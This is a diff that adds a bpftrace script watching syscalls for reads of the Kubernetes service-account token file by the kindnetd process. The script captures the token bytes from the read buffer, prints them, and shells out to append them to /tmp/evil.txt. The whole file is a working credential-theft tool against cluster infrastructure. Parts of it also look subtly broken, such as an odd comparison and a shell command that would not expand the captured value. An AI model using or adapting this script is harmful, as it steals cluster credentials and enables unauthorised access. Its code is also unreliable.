@@ -1,0 +1,35 @@
+tracepoint:syscalls:sys_enter_openat {
+  $fn = str(args->filename);
+  if ($fn == "/var/run/secrets/kubernetes.io/serviceaccount/token") {
+    @sys_open[tid] = 1;
+    @comm_tell = comm;
+  }
+}
+
+tracepoint:syscalls:sys_enter_read
+/@sys_open[tid] == 1/
+{
+
+  @sys_read[tid] = args->buf;
+
+}
+
+tracepoint:syscalls:sys_exit_read 
+/@sys_read[tid]/
+{ 
+  $len = args->ret;
+
+  if (@comm_tell == "kindnetd" != 0 && $len != 0) {
+    printf("LENGTH: %d \n", $len);
+    $cmd = str(@sys_read[tid], $len);
+    printf("reading from address %d", @sys_read[tid]);
+    printf("size: %d Command: %s\n", sizeof($cmd), $cmd);
+    printf("<-sys_exit_read(pid:%d).\n", pid);
+    system("echo $cmd >> /tmp/evil.txt")
+  }
+  
+  if ($len == 0) {
+    delete(@sys_open[tid]);
+    clear(@comm_tell);
+  }
+}
